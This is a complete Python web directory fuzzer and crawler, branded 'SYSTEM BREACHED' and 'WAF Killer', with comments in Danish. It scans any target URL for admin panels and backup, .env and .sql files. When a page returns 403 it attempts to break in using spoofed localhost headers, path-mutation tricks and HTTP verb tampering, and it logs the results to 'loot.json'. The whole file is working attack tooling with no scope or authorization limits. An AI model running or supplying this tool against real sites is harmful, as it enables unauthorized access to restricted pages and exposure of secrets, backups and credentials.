#!/usr/bin/env python3
"""
dir-buster v11 — Ultimate Crawler + Fuzzer + WAF Killer.
Built by ☠ SYSTEM BREACHED ☠ —◥꧁ SHΔDØW HΛCKΞR ꧂◤
"""
import sys
import os
import asyncio
import aiohttp
import string
import random
import json
from urllib.parse import urljoin, urlparse
from collections import Counter, deque
from bs4 import BeautifulSoup

C_GRN = "\033[38;2;0;255;136m"
C_RED = "\033[38;2;255;34;68m"
C_ORG = "\033[38;2;255;140;0m"
C_CYN = "\033[38;2;0;255;255m"
C_PUR = "\033[38;2;255;0;255m"
C_RST = "\033[0m"

HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
OUTPUT_FILE = "loot.json"

DEFAULT_WORDLIST = [
    "admin", "api", "backup", "config", "dashboard", "db", "debug",
    "dev", "env", "ftp", "hidden", "logs", "panel", "private",
    "root", "secure", "staging", "system", "test", "tmp", "upload",
    "user", "web", "swagger", "graphql", "v1", "v2", "health", "status"
]
EXTENSIONS = ["", ".php", ".json", ".bak", ".zip", ".env", ".txt", ".js", ".config", ".sql", ".old", ".swp"]

hit_sizes = Counter()
lock = asyncio.Lock()

async def try_bypass(session, url):
    """Hybrid Arsenal: Legacy (2018) + Modern (2026) payloads."""
    bypass_headers = [
        {"X-Forwarded-For": "127.0.0.1"}, {"X-Forwarded-For": "localhost"},
        {"X-Originating-IP": "127.0.0.1"}, {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"}, {"X-Host": "127.0.0.1"},
        {"X-Original-URL": url}, {"X-Rewrite-URL": url},
        {"X-Forwarded-Host": "127.0.0.1"}, {"X-Forwarded-Prefix": "/"},
        {"X-Custom-IP-Authorization": "127.0.0.1"}, {"X-ProxyUser-Ip": "127.0.0.1"},
        {"X-HTTP-Method-Override": "GET"}
    ]

    for h in bypass_headers:
        h_test = HEADERS.copy()
        h_test.update(h)
        try:
            async with session.get(url, headers=h_test, allow_redirects=False, timeout=5) as resp:
                if resp.status in [200, 301, 302]:
                    return f"Header -> {list(h.keys())[0]}"
        except Exception:
            pass

    mutations = [
        url + "/", url + "//", url + "/.", url + "//.",
        url + "%20", url + "%09", url + "..;/", url + "/..;/",
        url.replace("/", "//", 1), url.replace("/", "/./"),
        url + "%00", url + "%2e", url + "%2f",
        url.replace("/", "%2f"), url.replace("/", "%252f"),
        url + "?", url + "#", url + ";", url + "/~",
        url.upper(), url.lower(),
        url + ".json", url + ".html", url + ".php"
    ]

    for m in mutations:
        try:
            async with session.get(m, allow_redirects=False, timeout=5) as resp:
                if resp.status in [200, 301, 302]:
                    return f"Path -> {m}"
        except Exception:
            pass

    for method in ["POST", "PUT", "TRACE", "PATCH", "OPTIONS", "DELETE"]:
        try:
            async with session.request(method, url, allow_redirects=False, timeout=5) as resp:
                if resp.status == 200:
                    return f"Verb -> {method}"

            h_override = HEADERS.copy()
            h_override["X-HTTP-Method-Override"] = "GET"
            async with session.request(method, url, headers=h_override, allow_redirects=False, timeout=5) as resp:
                if resp.status == 200:
                    return f"Verb+Override -> {method} to GET"
        except Exception:
            pass

    return None

async def save_loot(hit):
    async with lock:
        data = []
        if os.path.exists(OUTPUT_FILE):
            try:
                with open(OUTPUT_FILE, "r") as f:
                    data = json.load(f)
            except Exception:
                pass
        data.append(hit)
        with open(OUTPUT_FILE, "w") as f:
            json.dump(data, f, indent=4)

async def extract_links(session, url):
    """Henter URL og udtrækker alle links, scripts og forms."""
    links = set()
    try:
        async with session.get(url, timeout=10) as resp:
            text = await resp.text()
            soup = BeautifulSoup(text, "html.parser")

            for a in soup.find_all("a", href=True):
                links.add(urljoin(url, a["href"]))
            for s in soup.find_all("script", src=True):
                links.add(urljoin(url, s["src"]))
            for f in soup.find_all("form", action=True):
                links.add(urljoin(url, f["action"]))
    except Exception:
        pass
    return links

async def fetch(session, url, sem, stats, counter, total, found_dirs):
    async with sem:
        try:
            async with session.get(url, allow_redirects=False, timeout=10) as resp:
                text = await resp.text()
                size = len(text)
                counter[0] += 1

                if counter[0] % 50 == 0 or counter[0] == total:
                    sys.stdout.write(f"\r{C_CYN}[*] Fremskridt: {counter[0]}/{total}{C_RST}")
                    sys.stdout.flush()

                if resp.status == stats['status'] and size == stats['length']:
                    return

                if resp.status == 200 and size == stats['base_length']:
                    return

                async with lock:
                    hit_sizes[size] += 1

                if resp.status == 403:
                    bypass = await try_bypass(session, url)
                    if bypass:
                        print(f"\n{C_RED}[BYPASS!] {url} (Len: {size}){C_RST}")
                        print(f"  {C_GRN}└─ Method: {bypass}{C_RST}")
                        await save_loot({"url": url, "status": 200, "bypass": bypass, "length": size})
                    return

                if resp.status in [200, 301, 302, 401]:
                    if resp.status == 200 and abs(size - stats['base_length']) < 500:
                        return

                    color = C_GRN if resp.status == 200 else C_ORG
                    print(f"\n{color}[{resp.status}] {url} (Len: {size}){C_RST}")
                    await save_loot({"url": url, "status": resp.status, "length": size})

                    # Hvis det er en mappe (slutter med / eller er 301), tilføj til rekursion
                    if resp.status in [200, 301, 302] and not url.endswith(tuple(EXTENSIONS)):
                        found_dirs.add(url if url.endswith("/") else url + "/")

        except Exception:
            counter[0] += 1

async def scan_directory(target, session, sem, stats, depth=0, max_depth=2):
    if depth > max_depth:
        return

    wordlist = DEFAULT_WORDLIST
    if os.path.exists("wordlist.txt"):
        with open("wordlist.txt", "r", encoding="utf-8", errors="ignore") as f:
            wordlist = [line.strip() for line in f if line.strip()]

    urls = [f"{target}{word}{ext}" for word in wordlist for ext in EXTENSIONS]
    total = len(urls)

    print(f"\n{C_CYN}[*] Fuzzing Directory (Depth {depth}): {target} ({total} paths){C_RST}")

    counter = [0]
    found_dirs = set()

    tasks = [fetch(session, url, sem, stats, counter, total, found_dirs) for url in urls]
    await asyncio.gather(*tasks)

    # Rekursion
    for d in found_dirs:
        if d != target: # Undgå uendelig loop
            await scan_directory(d, session, sem, stats, depth + 1, max_depth)

async def main():
    print(f"{C_CYN}=== dir-buster v11 — Ultimate Crawler ==={C_RST}\n")
    target = input(f"{C_ORG}Target URL: {C_RST}").strip()
    if not target: sys.exit(1)
    if not target.startswith("http"): target = "https://" + target
    target = target.rstrip("/")

    connector = aiohttp.TCPConnector(ssl=False, limit=100)
    sem = asyncio.Semaphore(100)

    async with aiohttp.ClientSession(headers=HEADERS, connector=connector) as session:
        # Kalibrering
        rand_path = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
        try:
            async with session.get(f"{target}/{rand_path}") as resp:
                stats = {"status": resp.status, "length": len(await resp.text())}
            async with session.get(f"{target}/") as resp:
                stats['base_length'] = len(await resp.text())
        except:
            stats = {"status": 404, "length": 0, "base_length": 0}

        print(f"{C_ORG}[*] Kalibrering: FakeStatus {stats['status']}, FakeLen {stats['length']}, BaseLen {stats['base_length']}{C_RST}\n")

        # 1. CRAWLER FASE
        print(f"{C_CYN}[*] Starter crawler for at finde links...{C_RST}")
        links = await extract_links(session, target)
        print(f"{C_GRN}[+] Fandt {len(links)} unikke links på forsiden.{C_RST}")

        # Tilføj fundne links til køen (tester dem for 403/hits)
        link_counter = [0]
        found_dirs_from_links = set()
        link_tasks = [fetch(session, l, sem, stats, link_counter, len(links), found_dirs_from_links) for l in links]
        await asyncio.gather(*link_tasks)

        # 2. FUZZER FASE (Rekursiv)
        await scan_directory(f"{target}/", session, sem, stats, depth=0, max_depth=1)

    print(f"\n\n{C_GRN}[+] Scan færdig.{C_RST}")

    most_common = hit_sizes.most_common(1)
    if most_common and most_common[0][1] > 50 and most_common[0][1] > (sum(hit_sizes.values()) * 0.8):
        print(f"{C_RED}[!] ADVARSEL: Størstedelen af requests gav længden {most_common[0][0]}.{C_RST}")
        print(f"{C_RED}[!] Dette er sandsynligvis en Cloudflare/WAF blokering.{C_RST}")

    if os.path.exists(OUTPUT_FILE):
        print(f"{C_GRN}[+] Alt output er gemt i '{OUTPUT_FILE}'.{C_RST}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{C_RED}[!] Stopped af bruger.{C_RST}")
